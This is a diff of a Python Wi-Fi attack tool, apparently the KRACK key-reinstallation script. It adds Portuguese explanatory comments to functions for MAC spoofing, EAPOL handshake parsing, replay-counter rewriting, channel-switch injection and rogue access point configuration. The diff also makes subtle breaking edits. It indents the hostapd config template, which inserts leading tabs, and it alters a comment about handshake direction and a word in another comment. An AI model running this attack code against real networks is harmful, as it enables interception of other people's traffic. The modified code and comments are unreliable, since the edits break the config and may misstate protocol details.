@@ -65,6 +65,7 @@ def log(level, msg, color=None, showtime=True):
 
 #### Packet Processing Functions ####
 
+#ESSA CLASSE DETERMINA A CRIACAO DE SOCKETS E ENVIO E RECEBIMENTO DE PACOTES PELOS MESMOS
 class MitmSocket(L2Socket):
 	def __init__(self, dumpfile=None, strict_echo_test=False, **kwargs):
 		super(MitmSocket, self).__init__(**kwargs)
@@ -138,6 +139,7 @@ class MitmSocket(L2Socket):
 		if self.pcap: self.pcap.close()
 		super(MitmSocket, self).close()
 
+#CHAMA A FUNCAO QUE ALTERA O ENDERECO MAC DA INTERFACE
 def call_macchanger(iface, macaddr):
 	try:
 		subprocess.check_output(["macchanger", "-m", macaddr, iface])
@@ -145,11 +147,13 @@ def call_macchanger(iface, macaddr):
 		if not "It's the same MAC!!" in ex.output:
 			raise
 
+#CONFIGURA O NOVO ENDERECO MAC NA INTERFACE
 def set_mac_address(iface, macaddr):
 	subprocess.check_output(["ifconfig", iface, "down"])
 	call_macchanger(iface, macaddr)
 	subprocess.check_output(["ifconfig", iface, "up"])
 
+#FUNCAO INUTILIZADA! SERA QUE PODEMOS APAGAR?
 def set_monitor_ack_address(iface, macaddr, sta_suffix=None):
 	"""Add a virtual STA interface for ACK generation. This assumes nothing takes control of this
 	   interface, meaning it remains on the current channel."""
@@ -162,9 +166,11 @@ def set_monitor_ack_address(iface, macaddr, sta_suffix=None):
 def xorstr(lhs, rhs):
 	return "".join([chr(ord(lb) ^ ord(rb)) for lb, rb in zip(lhs, rhs)])
 
+#RETORNA O SEQUENCE NUMBER DO PACOTE (802.11 MAC HEADER)
 def dot11_get_seqnum(p):
 	return p[Dot11].SC >> 4
 
+#RETORNA O IV DO PACOTE
 def dot11_get_iv(p):
 	"""Scapy can't handle Extended IVs, so do this properly ourselves"""
 	if Dot11WEP not in p:
@@ -182,10 +188,12 @@ def dot11_get_tid(p):
 		return ord(str(p[Dot11QoS])[0]) & 0x0F
 	return 0
 
+#DETECTA SE A MENSAGEM ENVIADA E UM BROADCAST
 def dot11_is_group(p):
 	# TODO: Detect if multicast bit is set in p.addr1
 	return p.addr1 == "ff:ff:ff:ff:ff:ff"
 
+#RETORNA O NUMERO DA MENSAGEM EAPOL NO 4-WAY HANDSHAKE
 def get_eapol_msgnum(p):
 	FLAG_PAIRWISE = 0b0000001000
 	FLAG_ACK      = 0b0010000000
@@ -202,7 +210,7 @@ def get_eapol_msgnum(p):
 			if flags & FLAG_SECURE: return 3
 			else: return 1
 		else:
-			# sent by server
+			# sent by client
 			# FIXME: use p[EAPOL.load] instead of str(p[EAPOL])
 			keydatalen = struct.unpack(">H", str(p[EAPOL])[97:99])[0]
 			if keydatalen == 0: return 4
@@ -210,6 +218,7 @@ def get_eapol_msgnum(p):
 
 	return 0
 
+#RETORNA O REPLAY COUNTER DO EAPOL
 def get_eapol_replaynum(p):
 	# FIXME: use p[EAPOL.load] instead of str(p[EAPOL])
 	return struct.unpack(">Q", str(p[EAPOL])[9:17])[0]
@@ -218,6 +227,7 @@ def set_eapol_replaynum(p, value):
 	p[EAPOL].load = p[EAPOL].load[:5] + struct.pack(">Q", value) + p[EAPOL].load[13:]
 	return p
 
+#FUNCAO PARA RETORNAR UMA STRING A PARTIR DE UM PACOTE 802.11
 def dot11_to_str(p):
 	EAP_CODE = {1: "Request"}
 	EAP_TYPE = {1: "Identity"}
@@ -250,6 +260,7 @@ def dot11_to_str(p):
 			else:                return repr(p)
 	return repr(p)			
 
+#FUNCAO PARA CONSTRUIR UM ELEMENTO CSA
 def construct_csa(channel, count=1):
 	switch_mode = 1			# STA should not Tx untill switch is completed
 	new_chan_num = channel	# Channel it should switch to
@@ -259,6 +270,7 @@ def construct_csa(channel, count=1):
 	payload = struct.pack("<BBB", switch_mode, new_chan_num, switch_count)
 	return Dot11Elt(ID=IEEE_TLV_TYPE_CSA, info=payload)
 
+#FUNCAO PARA INSERIR O ELEMENTO CSA NUM PACOTE BEACON PREVIAMENTE CAPTURADO
 def append_csa(p, channel, count=1):
 	p = p.copy()
 
@@ -272,6 +284,7 @@ def append_csa(p, channel, count=1):
 
 	return p
 
+#RETORNA O VALOR PARA UM DETERMINADO TIPO DE ELEMENTO DENTRO DO PACOTE P
 def get_tlv_value(p, type):
 	if not Dot11Elt in p: return None
 	el = p[Dot11Elt]
@@ -284,12 +297,13 @@ def get_tlv_value(p, type):
 
 #### Man-in-the-middle Code ####
 
+#FUNCAO PARA PRINTAR NO CONSOLE UM PACOTE RECEBIDO
 def print_rx(level, name, p, color=None, suffix=None):
 	if p[Dot11].type == 1: return
 	if color is None and (Dot11Deauth in p or Dot11Disas in p): color="orange"
 	log(level, "%s: %s -> %s: %s%s" % (name, p.addr2, p.addr1, dot11_to_str(p), suffix if suffix else ""), color=color)
 
-
+#CLASSE PARA CONFIGURAR O ROUGUE AP BASEADO NO BEACON CAPTURADO
 class NetworkConfig():
 	def __init__(self):
 		self.ssid = None
@@ -301,26 +315,32 @@ class NetworkConfig():
 		self.wmmenabled = 0
 		self.capab = 0
 
+	#VERIFICA SE A REDE E WPA OU WPA2
 	def is_wparsn(self):
 		return not self.group_cipher is None and self.wpavers > 0 and \
 			len(self.pairwise_ciphers) > 0 and len(self.akms) > 0
 
 	# TODO: Improved parsing to handle more networks
 	def parse_wparsn(self, wparsn):
+
+		#OBTEM O GROUP CIPHER SUITE
 		self.group_cipher = ord(wparsn[5])
 
+		#RETORNA A LISTA LISTA DE PAIRWISE CIPHER SUITES
 		num_pairwise = struct.unpack("<H", wparsn[6:8])[0]
 		pos = wparsn[8:]
 		for i in range(num_pairwise):
 			self.pairwise_ciphers.add(ord(pos[3]))
 			pos = pos[4:]
 
+		#RETORNA A LISTA DE AUTH KEY MANAGEMENT
 		num_akm = struct.unpack("<H", pos[:2])[0]
 		pos = pos[2:]
 		for i in range(num_akm):
 			self.akms.add(ord(pos[3]))
 			pos = pos[4:]
 
+		#OBTEM AS CAPACIDADES DO RSN
 		if len(pos) >= 2:
 			self.capab = struct.unpack("<H", pos[:2])[0]
 
@@ -349,25 +369,25 @@ class NetworkConfig():
 
 	def write_config(self, iface):
 		TEMPLATE = """
-ctrl_interface=hostapd_ctrl
-ctrl_interface_group=0
+		ctrl_interface=hostapd_ctrl
+		ctrl_interface_group=0
 
-interface={iface}
-ssid={ssid}
-channel={channel}
+		interface={iface}
+		ssid={ssid}
+		channel={channel}
 
-wpa={wpaver}
-wpa_key_mgmt={akms}
-wpa_pairwise={pairwise}
-rsn_pairwise={pairwise}
-rsn_ptksa_counters={ptksa_counters}
-rsn_gtksa_counters={gtksa_counters}
+		wpa={wpaver}
+		wpa_key_mgmt={akms}
+		wpa_pairwise={pairwise}
+		rsn_pairwise={pairwise}
+		rsn_ptksa_counters={ptksa_counters}
+		rsn_gtksa_counters={gtksa_counters}
 
-wmm_enabled={wmmenabled}
-wmm_advertised={wmmadvertised}
-hw_mode=g
-auth_algs=3
-wpa_passphrase=XXXXXXXX"""
+		wmm_enabled={wmmenabled}
+		wmm_advertised={wmmadvertised}
+		hw_mode=g
+		auth_algs=3
+		wpa_passphrase=XXXXXXXX"""
 		akm2str = {2: "WPA-PSK", 1: "WPA-EAP"}
 		ciphers2str = {2: "TKIP", 4: "CCMP"}
 		return TEMPLATE.format(
@@ -377,12 +397,13 @@ wpa_passphrase=XXXXXXXX"""
 			wpaver = self.wpavers,
 			akms = " ".join([akm2str[idx] for idx in self.akms]),
 			pairwise = " ".join([ciphers2str[idx] for idx in self.pairwise_ciphers]),
+			#as duas linhas seguintes sera que sao mesmo necessarias?
 			ptksa_counters = (self.capab & 0b001100) >> 2,
 			gtksa_counters = (self.capab & 0b110000) >> 4,
 			wmmadvertised = int(args.group),
 			wmmenabled = self.wmmenabled)
 
-
+#DETERMINA O ESTADO EM QUE O CLIENTE SE ENCONTRA
 class ClientState():
 	Initializing, Connecting, GotMitm, Attack_Started, Success_Reinstalled, Success_AllzeroKey, Failed = range(7)
 
@@ -867,7 +888,7 @@ class KRAckAttack():
 				subprocess.check_output(["iw", self.nic_real, "interface", "add", self.nic_real_clientack, "type", "managed"])
 				call_macchanger(self.nic_real_clientack, self.clientmac)
 		else:
-			# Note: some APs require handshake messages to be ACKed before proceeding (e.g. Broadcom waits for ACK on Msg1)
+			# Note: some APs require handshake messages to be ACKed before proceeding (e.g. Broadcom waits for AC on Msg1)
 			log(WARNING, "WARNING: Targeting ALL clients is not fully supported! Please provide a specific target using --target.")
 			# Sleep for a second to make this warning very explicit
 			time.sleep(1)
